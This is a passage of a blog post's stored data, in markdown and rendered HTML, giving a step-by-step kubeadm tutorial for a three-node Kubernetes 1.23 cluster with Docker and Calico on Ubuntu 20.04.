to install a container runtime to work correctly.There are many available options like containerd, CRI-O, Docker etc\n\nBy default, Kubernetes uses the Container Runtime Interface (CRI) to interface with your chosen container runtime.If you don't specify a runtime, kubeadm automatically tries to detect an installed container runtime by scanning through a list of known endpoints.\n\nYou must install the Docker Engine on each node! \n\n#### 1- Set up the repository \n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt update\n4n6nk8s@4n6nk8s-master:~$ sudo apt install ca-certificates curl gnupg lsb-release\n```\n#### 2- Add Docker's official GPG key\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo mkdir -p /etc/apt/keyrings\n4n6nk8s@4n6nk8s-master:~$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n```\n#### 3- Add the stable repository using the following command:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ echo \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\\n  $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\n```\n#### 4- Install the docker container\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt update && sudo apt install docker-ce docker-ce-cli containerd.io -y\n``` \n\n#### 5- Make sure that the docker will work on system startup\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo systemctl enable --now docker \n```\n#### 6- Configuring Cgroup Driver:  \nThe Cgroup Driver must be configured to let the kubelet process work correctly\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ cat <<EOF | sudo tee /etc/docker/daemon.json\n{\n  \"exec-opts\": [\"native.cgroupdriver=systemd\"],\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"100m\"\n  },\n  \"storage-driver\": \"overlay2\"\n}\nEOF\n```\n#### 7- Restart the docker service to make sure the new configuration is applied\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo systemctl daemon-reload && sudo systemctl restart docker\n```\n### Installing kubernetes (kubeadm, kubelet, and kubectl):\n\nInstall the following dependency required by Kubernetes on each node\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt install apt-transport-https\n```\n#### Download the Google Cloud public signing key:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg\n``` \n#### Add the Kubernetes apt repository:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ echo \"deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list\n```\n#### Update the apt package index and install kubeadm, kubelet, and kubeclt\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt update && sudo apt install -y kubelet=1.23.1-00 kubectl=1.23.1-00 kubeadm=1.23.1-00\n```\n\n## Initializing the control-plane node\nAt this point, we have 3 nodes with docker, `kubeadm`, `kubelet`, and `kubectl` installed. Now we must initialize the Kubernetes master, which will manage the whole cluster and the pods running within the cluster `kubeadm init` by specifiy the address of the master node and the ipv4 address pool of the pods \n\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo kubeadm init --apiserver-advertise-address=192.168.1.18 --pod-network-cidr=10.1.0.0/16\n```\nYou should wait a few minutes until the initialization is completed. The first initialization will take a lot of time if your connexion speed is slow (pull the images of the cluster components)\n\n### Configuring kubectl \nAs known, the `kubectl` is a command line tool for performing actions on your cluster. So we must to configure `kubectl`. Run the following command from your master node:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ mkdir -p $HOME/.kube\n4n6nk8s@4n6nk8s-master:~$ sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n4n6nk8s@4n6nk8s-master:~$ sudo chown $(id -u):$(id -g) $HOME/.kube/config\n```\n### Installing Calico CNI \nCalico provides network and network security solutions for containers. Calico is best known for its performance, flexibility and power. Use-cases: Calico can be used within a lot of Kubernetes platforms (kops, Kubespray, docker enterprise, etc.) to block or allow traffic between pods, namespaces\n\n#### 1- Install Tigera Calico operator\n```bash command line prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl create -f \"https://projectcalico.docs.tigera.io/manifests/tigera-operator.yaml\"\n```\nThe Tigera Operator is a Kubernetes operator which manages the lifecycle of a Calico or Calico Enterprise installation on Kubernetes. Its goal is to make installation, upgrades, and ongoing lifecycle management of Calico and Calico Enterprise as simple and reliable as possible.\n\n#### 2- Download the custom-resources.yaml manifest and change it \nThe Calico has a default pod's CIDR value. But in our example, we set the  `--pod-netwokr-cidr=10.1.0.0/16`. So we must change the value of pod network CIDR in `custom-resources.yaml`\n\n```bash command line prompt \n4n6nk8s@4n6nk8s-master:~$ wget  \"https://projectcalico.docs.tigera.io/manifests/custom-resources.yaml\"\n```\nNow we edit this file before create the Calico pods\n\n```yml\n\n# This section includes base Calico installation configuration.\n# For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.Installation\napiVersion: operator.tigera.io/v1\nkind: Installation\nmetadata:\n  name: default\nspec:\n  # Configures Calico networking.\n  calicoNetwork:\n    # Note: The ipPools section cannot be modified post-install.\n    ipPools:\n    - blockSize: 26\n      cidr: 10.1.0.0/16 #change this value with yours\n      encapsulation: VXLANCrossSubnet\n      natOutgoing: Enabled\n      nodeSelector: all()\n\n---\n\n# This section configures the Calico API server.\n# For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.APIServer\napiVersion: operator.tigera.io/v1\nkind: APIServer \nmetadata: \n  name: default \nspec: {}\n```\nAfter Editing the `custom-resources.yaml` file. Run the following command:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl create -f \"custom-resources.yaml\" \n```\nBefore you can use the cluster, you must wait for the pods required by Calico to be downloaded. You must wait until you find all the pods running and ready! \n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl get pods --all-namespaces\nNAMESPACE          NAME                                       READY   STATUS    RESTARTS       AGE\ncalico-apiserver   calico-apiserver-5989576d6d-5nw7n          1/1     Running   1 (4min ago)    4min\ncalico-apiserver   calico-apiserver-5989576d6d-h677h          1/1     Running   1 (4min ago)    4min\ncalico-system      calico-kube-controllers-69cfd64db4-9hnh5   1/1     Running   1 (4min ago)    4min\ncalico-system      calico-node-lshdl                          1/1     Running   1 (4min ago)    4min\ncalico-system      calico-typha-76dd7c96d7-88826              1/1     Running   1 (4min ago)    4min\nkube-system        coredns-64897985d-jkpwh                    1/1     Running   1 (4min ago)    4min\nkube-system        coredns-64897985d-zk9wx                    1/1     Running   1 (4min ago)    4min\nkube-system        etcd-master                                1/1     Running   1 (4min ago)    4min\nkube-system        kube-apiserver-master                      1/1     Running   1 (4min ago)    4min\nkube-system        kube-controller-manager-master             1/1     Running   1 (4min ago)    4min\nkube-system        kube-proxy-4nf4q                           1/1     Running   1 (4min ago)    4min\nkube-system        kube-scheduler-master                      1/1     Running   1 (4min ago)    4min\ntigera-operator    tigera-operator-7d8c9d4f67-j5b2g           1/1     Running   2 (103s ago)    4min\n```\n\n## Join the worker nodes\nNow our cluster is ready to work! let's join the worker nodes to this cluster by getting the token from the master node \n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo kubeadm token create --print-join-command\nkubeadm join 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt --discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec\n```\nNow let's move to the worker node and run the following command given by `kubeadm token create`\n\n```bash command line prompt \n4n6nk8s@4n6nk8s-worker1:~$ sudo kubeadm join 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt \n\\--discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec\n``` \n\nThe output must be similar to the following \n```bash command line prompt\n[preflight] Running pre-flight checks\n[preflight] Reading configuration from the cluster...\n[preflight] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\nW0623 12:45:07.940655   23651 utils.go:69] The recommended value for \"resolvConf\" in \"KubeletConfiguration\" is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[kubelet-start] Writing kubelet environment file with flags to file \"/var/lib/kubelet/kubeadm-flags.env\"\n[kubelet-start] Starting the kubelet\n[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...\n\nThis node has joined the cluster:\n* Certificate signing request was sent to apiserver and a response was received.\n* The Kubelet was informed of the new secure connection details.\n\nRun 'kubectl get nodes' on the control-plane to see this node join the cluster.\n\n```\nNow let's Check the cluster by running `kubectl get nodes` command on the master node.\n\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl get nodes\n\nNAME              STATUS     ROLES                  AGE    VERSION\n4n6nk8s-master    Ready      control-plane,master   40m5s  v1.23.1\n4n6nk8s-worker1   Ready      <none>                 3m7s   v1.23.1\n4n6nk8s-worker2   Ready      <none>                 2m3s   v1.23.1\n```\n\n\n\n\n## References:\n\n\n{% links %}\n- site: Kubernetes Documentation\n  url: https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/\n  desc: Creating a cluster with kubeadm\n  image: https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Kubernetes_logo_without_workmark.svg/1200px-Kubernetes_logo_without_workmark.svg.png\n  color: \"#2296fd\"\n- site: Calico Documentation\n  desc: Install Calico Networking for on-premises deployments\n  url: https://projectcalico.docs.tigera.io/getting-started/kubernetes/self-managed-onprem/onpremises\n  image: https://projectcalico.docs.tigera.io/images/favicon.png\n  color: \"#FB7031\"\n- site: Docker Documentation\n  url: https://docs.docker.com/engine/install/ubuntu/\n  desc: Install Docker Engine on Ubuntu\n  image: https://www.docker.com/wp-content/uploads/2022/05/Docker_Temporary_Image_Google_Blue_1080x1080_v1.png\n  color: \"#31bffb\"\n{% endlinks %}\n\n","source":"_posts/Kubernetes/kubeadm.md","raw":"---\ntitle: Setting Up Kubernetes with Kubeadm\ndate: 2022-08-05 11:54:12\ntags:\ncover: https://i.imgur.com/bhUlMFS.png\ncategories:\n- [Kubernetes]\n\n---\n[Kubeadm]{.red} is a tool used to build Kubernetes (K8s) clusters. Kubeadm performs the actions necessary to get a minimum viable cluster up and running quickly. By design, it cares only about bootstrapping, not about provisioning machines (underlying worker and master nodes).\n\n:::success\nKnowing how to use kubeadm is required for CKA and CKS exams\n:::\n\nWe configure a 3 [Ubuntu 20.04 LTS]{.pinky} machines in the same network with the following proprietes:\n| Role   | Hostname         | IP address      | \n| -------| ---------------- | --------------- |\n| Master | 4n6nk8s-master   | 192.168.1.18/24 | \n| Worker | 4n6nk8s-worker1  | 192.168.1.19/24 | \n| Worker | 4n6nk8s-worker2  | 192.168.1.20/24 | \n\n> Note: Make sure to setup a unique hostname for each host\n\n## Prepare the environments\nThe following Steps must be applied to each node (both master nodes and worker nodes)\n### Disable the Swap Memory\nThe Kubernetes requires that you disable the swap memory in the host system because the kubernetes scheduler determines the best available node on which to deploy newly created pods. If memory swapping is allowed to occur on a host system, this can lead to performance and stability issues within Kubernetes\n\nYou can disable the swap memory by deleting or commenting the swap entry in `/etc/fstab` manually or using the `sed` command\n\n```bash command line prompt\n4n6nk8s@4n6nk8s-master$ sudo swapoff -a && sudo sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab\n```\n\nThis command disbales the swap memory and comments out the swap entry in `/etc/fstab` \n\n### Configure or Disable the firewall\nWhen running Kubernetes in an environment with strict network boundaries, such as on-premises datacenter with physical network firewalls or Virtual Networks in Public Cloud, it is useful to be aware of the ports and protocols used by Kubernetes components.\n\nThe ports used by Master Node:\n\n| Protocol  | Direction     | Port Range    |  Purpose \n| -------   | ------------- | ------------- | -------\n| TCP       | Inbound       | 6443          | Kubernetes API server\n| TCP       | Inbound       | 2379-2380     | etcd server client API\n| TCP       | Inbound       | 10250         | Kubelet API\n| TCP       | Inbound       | 10259         | kube-scheduler\n| TCP       | Inbound       | 10257         | kube-controller-manager\n\nThe ports used by Worker Nodes: \n\n| Protocol  | Direction     | Port Range    |  Purpose \n| -------   | ------------- | ------------- | -------\n| TCP       | Inbound       | 10250         | Kubelet API\n| TCP       | Inbound       | 30000-32767   | NodePort Services\n\n\nYou can either disable the firewall or allow the ports on each node.\n#### Method 1: Add firewall rules to allow the ports used by the Kubernetes nodes\nAllow the ports used by the master node:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 6443/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 2379:2380/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10250/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10259/tcp\n4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10257/tcp\n```\nAllow the ports used by the worker nodes:\n```bash command line prompt\n4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 10250/tcp\n4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 30000:32767/tcp\n```\n#### Method 2: Disable the firewall\n```bash command line prompt command\n4n6nk8s@4n6nk8s-master:~$ sudo ufw status\nStatus: active\n\n4n6nk8s@4n6nk8s-master:~$ sudo ufw disable\nFirewall stopped and disabled on system startup\n\n4n6nk8s@4n6nk8s-master:~$ sudo ufw status\nStatus: inactive\n```\n\n### Installing Docker Engine\nKubernetes requires you to install a container runtime to work correctly.There are many available options like containerd, CRI-O, Docker etc\n\nBy default, Kubernetes uses the Container Runtime Interface (CRI) to interface with your chosen container runtime.If you don't specify a runtime, kubeadm automatically tries to detect an installed container runtime by scanning through a list of known endpoints.\n\nYou must install the Docker Engine on each node! \n\n#### 1- Set up the repository \n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt update\n4n6nk8s@4n6nk8s-master:~$ sudo apt install ca-certificates curl gnupg lsb-release\n```\n#### 2- Add Docker's official GPG key\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo mkdir -p /etc/apt/keyrings\n4n6nk8s@4n6nk8s-master:~$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n```\n#### 3- Add the stable repository using the following command:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ echo \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\\n  $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\n```\n#### 4- Install the docker container\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt update && sudo apt install docker-ce docker-ce-cli containerd.io -y\n``` \n\n#### 5- Make sure that the docker will work on system startup\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo systemctl enable --now docker \n```\n#### 6- Configuring Cgroup Driver:  \nThe Cgroup Driver must be configured to let the kubelet process work correctly\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ cat <<EOF | sudo tee /etc/docker/daemon.json\n{\n  \"exec-opts\": [\"native.cgroupdriver=systemd\"],\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"100m\"\n  },\n  \"storage-driver\": \"overlay2\"\n}\nEOF\n```\n#### 7- Restart the docker service to make sure the new configuration is applied\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo systemctl daemon-reload && sudo systemctl restart docker\n```\n### Installing kubernetes (kubeadm, kubelet, and kubectl):\n\nInstall the following dependency required by Kubernetes on each node\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt install apt-transport-https\n```\n#### Download the Google Cloud public signing key:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg\n``` \n#### Add the Kubernetes apt repository:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ echo \"deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list\n```\n#### Update the apt package index and install kubeadm, kubelet, and kubeclt\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo apt update && sudo apt install -y kubelet=1.23.1-00 kubectl=1.23.1-00 kubeadm=1.23.1-00\n```\n\n## Initializing the control-plane node\nAt this point, we have 3 nodes with docker, `kubeadm`, `kubelet`, and `kubectl` installed. Now we must initialize the Kubernetes master, which will manage the whole cluster and the pods running within the cluster `kubeadm init` by specifiy the address of the master node and the ipv4 address pool of the pods \n\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo kubeadm init --apiserver-advertise-address=192.168.1.18 --pod-network-cidr=10.1.0.0/16\n```\nYou should wait a few minutes until the initialization is completed. The first initialization will take a lot of time if your connexion speed is slow (pull the images of the cluster components)\n\n### Configuring kubectl \nAs known, the `kubectl` is a command line tool for performing actions on your cluster. So we must to configure `kubectl`. Run the following command from your master node:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ mkdir -p $HOME/.kube\n4n6nk8s@4n6nk8s-master:~$ sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n4n6nk8s@4n6nk8s-master:~$ sudo chown $(id -u):$(id -g) $HOME/.kube/config\n```\n### Installing Calico CNI \nCalico provides network and network security solutions for containers. Calico is best known for its performance, flexibility and power. Use-cases: Calico can be used within a lot of Kubernetes platforms (kops, Kubespray, docker enterprise, etc.) to block or allow traffic between pods, namespaces\n\n#### 1- Install Tigera Calico operator\n```bash command line prompt \n4n6nk8s@4n6nk8s-master:~$ kubectl create -f \"https://projectcalico.docs.tigera.io/manifests/tigera-operator.yaml\"\n```\nThe Tigera Operator is a Kubernetes operator which manages the lifecycle of a Calico or Calico Enterprise installation on Kubernetes. Its goal is to make installation, upgrades, and ongoing lifecycle management of Calico and Calico Enterprise as simple and reliable as possible.\n\n#### 2- Download the custom-resources.yaml manifest and change it \nThe Calico has a default pod's CIDR value. But in our example, we set the  `--pod-netwokr-cidr=10.1.0.0/16`. So we must change the value of pod network CIDR in `custom-resources.yaml`\n\n```bash command line prompt \n4n6nk8s@4n6nk8s-master:~$ wget  \"https://projectcalico.docs.tigera.io/manifests/custom-resources.yaml\"\n```\nNow we edit this file before create the Calico pods\n\n```yml\n\n# This section includes base Calico installation configuration.\n# For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.Installation\napiVersion: operator.tigera.io/v1\nkind: Installation\nmetadata:\n  name: default\nspec:\n  # Configures Calico networking.\n  calicoNetwork:\n    # Note: The ipPools section cannot be modified post-install.\n    ipPools:\n    - blockSize: 26\n      cidr: 10.1.0.0/16 #change this value with yours\n      encapsulation: VXLANCrossSubnet\n      natOutgoing: Enabled\n      nodeSelector: all()\n\n---\n\n# This section configures the Calico API server.\n# For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.APIServer\napiVersion: operator.tigera.io/v1\nkind: APIServer \nmetadata: \n  name: default \nspec: {}\n```\nAfter Editing the `custom-resources.yaml` file. Run the following command:\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl create -f \"custom-resources.yaml\" \n```\nBefore you can use the cluster, you must wait for the pods required by Calico to be downloaded. You must wait until you find all the pods running and ready! \n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl get pods --all-namespaces\nNAMESPACE          NAME                                       READY   STATUS    RESTARTS       AGE\ncalico-apiserver   calico-apiserver-5989576d6d-5nw7n          1/1     Running   1 (4min ago)    4min\ncalico-apiserver   calico-apiserver-5989576d6d-h677h          1/1     Running   1 (4min ago)    4min\ncalico-system      calico-kube-controllers-69cfd64db4-9hnh5   1/1     Running   1 (4min ago)    4min\ncalico-system      calico-node-lshdl                          1/1     Running   1 (4min ago)    4min\ncalico-system      calico-typha-76dd7c96d7-88826              1/1     Running   1 (4min ago)    4min\nkube-system        coredns-64897985d-jkpwh                    1/1     Running   1 (4min ago)    4min\nkube-system        coredns-64897985d-zk9wx                    1/1     Running   1 (4min ago)    4min\nkube-system        etcd-master                                1/1     Running   1 (4min ago)    4min\nkube-system        kube-apiserver-master                      1/1     Running   1 (4min ago)    4min\nkube-system        kube-controller-manager-master             1/1     Running   1 (4min ago)    4min\nkube-system        kube-proxy-4nf4q                           1/1     Running   1 (4min ago)    4min\nkube-system        kube-scheduler-master                      1/1     Running   1 (4min ago)    4min\ntigera-operator    tigera-operator-7d8c9d4f67-j5b2g           1/1     Running   2 (103s ago)    4min\n```\n\n## Join the worker nodes\nNow our cluster is ready to work! let's join the worker nodes to this cluster by getting the token from the master node \n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ sudo kubeadm token create --print-join-command\nkubeadm join 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt --discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec\n```\nNow let's move to the worker node and run the following command given by `kubeadm token create`\n\n```bash command line prompt \n4n6nk8s@4n6nk8s-worker1:~$ sudo kubeadm join 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt \n\\--discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec\n``` \n\nThe output must be similar to the following \n```bash command line prompt\n[preflight] Running pre-flight checks\n[preflight] Reading configuration from the cluster...\n[preflight] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\nW0623 12:45:07.940655   23651 utils.go:69] The recommended value for \"resolvConf\" in \"KubeletConfiguration\" is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[kubelet-start] Writing kubelet environment file with flags to file \"/var/lib/kubelet/kubeadm-flags.env\"\n[kubelet-start] Starting the kubelet\n[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...\n\nThis node has joined the cluster:\n* Certificate signing request was sent to apiserver and a response was received.\n* The Kubelet was informed of the new secure connection details.\n\nRun 'kubectl get nodes' on the control-plane to see this node join the cluster.\n\n```\nNow let's Check the cluster by running `kubectl get nodes` command on the master node.\n\n```bash command line prompt\n4n6nk8s@4n6nk8s-master:~$ kubectl get nodes\n\nNAME              STATUS     ROLES                  AGE    VERSION\n4n6nk8s-master    Ready      control-plane,master   40m5s  v1.23.1\n4n6nk8s-worker1   Ready      <none>                 3m7s   v1.23.1\n4n6nk8s-worker2   Ready      <none>                 2m3s   v1.23.1\n```\n\n\n\n\n## References:\n\n\n{% links %}\n- site: Kubernetes Documentation\n  url: https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/\n  desc: Creating a cluster with kubeadm\n  image: https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Kubernetes_logo_without_workmark.svg/1200px-Kubernetes_logo_without_workmark.svg.png\n  color: \"#2296fd\"\n- site: Calico Documentation\n  desc: Install Calico Networking for on-premises deployments\n  url: https://projectcalico.docs.tigera.io/getting-started/kubernetes/self-managed-onprem/onpremises\n  image: https://projectcalico.docs.tigera.io/images/favicon.png\n  color: \"#FB7031\"\n- site: Docker Documentation\n  url: https://docs.docker.com/engine/install/ubuntu/\n  desc: Install Docker Engine on Ubuntu\n  image: https://www.docker.com/wp-content/uploads/2022/05/Docker_Temporary_Image_Google_Blue_1080x1080_v1.png\n  color: \"#31bffb\"\n{% endlinks %}\n\n","slug":"Kubernetes/kubeadm","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnj000cd5qf1m8xb8rz","content":"<p><span class=\"red\">Kubeadm</span> is a tool used to build Kubernetes (K8s) clusters. Kubeadm performs the actions necessary to get a minimum viable cluster up and running quickly. By design, it cares only about bootstrapping, not about provisioning machines (underlying worker and master nodes).</p>\n<div class=\"note success\">\n<p>Knowing how to use kubeadm is required for CKA and CKS exams</p>\n</div>\n<p>We configure a 3 <span class=\"pinky\">Ubuntu 20.04 LTS</span> machines in the same network with the following proprietes:</p>\n<table>\n<thead>\n<tr>\n<th>Role</th>\n<th>Hostname</th>\n<th>IP address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Master</td>\n<td>4n6nk8s-master</td>\n<td>192.168.1.18/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker1</td>\n<td>192.168.1.19/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker2</td>\n<td>192.168.1.20/24</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>Note: Make sure to setup a unique hostname for each host</p>\n</blockquote>\n<h2 id=\"prepare-the-environments\"><a class=\"markdownIt-Anchor\" href=\"#prepare-the-environments\">#</a> Prepare the environments</h2>\n<p>The following Steps must be applied to each node (both master nodes and worker nodes)</p>\n<h3 id=\"disable-the-swap-memory\"><a class=\"markdownIt-Anchor\" href=\"#disable-the-swap-memory\">#</a> Disable the Swap Memory</h3>\n<p>The Kubernetes requires that you disable the swap memory in the host system because the kubernetes scheduler determines the best available node on which to deploy newly created pods. If memory swapping is allowed to occur on a host system, this can lead to performance and stability issues within Kubernetes</p>\n<p>You can disable the swap memory by deleting or commenting the swap entry in  <code>/etc/fstab</code>  manually or using the  <code>sed</code>  command</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master$ sudo swapoff -a &amp;&amp; sudo sed -i <span class=\"string\">&#x27;/ swap / s/^\\(.*\\)$/#\\1/g&#x27;</span> /etc/fstab</span><br></pre></td></tr></table></figure>\n<p>This command disbales the swap memory and comments out the swap entry in  <code>/etc/fstab</code></p>\n<h3 id=\"configure-or-disable-the-firewall\"><a class=\"markdownIt-Anchor\" href=\"#configure-or-disable-the-firewall\">#</a> Configure or Disable the firewall</h3>\n<p>When running Kubernetes in an environment with strict network boundaries, such as on-premises datacenter with physical network firewalls or Virtual Networks in Public Cloud, it is useful to be aware of the ports and protocols used by Kubernetes components.</p>\n<p>The ports used by Master Node:</p>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Direction</th>\n<th>Port Range</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>6443</td>\n<td>Kubernetes API server</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>2379-2380</td>\n<td>etcd server client API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10250</td>\n<td>Kubelet API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10259</td>\n<td>kube-scheduler</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10257</td>\n<td>kube-controller-manager</td>\n</tr>\n</tbody>\n</table>\n<p>The ports used by Worker Nodes:</p>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Direction</th>\n<th>Port Range</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10250</td>\n<td>Kubelet API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>30000-32767</td>\n<td>NodePort Services</td>\n</tr>\n</tbody>\n</table>\n<p>You can either disable the firewall or allow the ports on each node.</p>\n<h4 id=\"method-1-add-firewall-rules-to-allow-the-ports-used-by-the-kubernetes-nodes\"><a class=\"markdownIt-Anchor\" href=\"#method-1-add-firewall-rules-to-allow-the-ports-used-by-the-kubernetes-nodes\">#</a> Method 1: Add firewall rules to allow the ports used by the Kubernetes nodes</h4>\n<p>Allow the ports used by the master node:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 6443/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 2379:2380/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10250/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10259/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10257/tcp</span><br></pre></td></tr></table></figure>\n<p>Allow the ports used by the worker nodes:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 10250/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 30000:32767/tcp</span><br></pre></td></tr></table></figure>\n<h4 id=\"method-2-disable-the-firewall\"><a class=\"markdownIt-Anchor\" 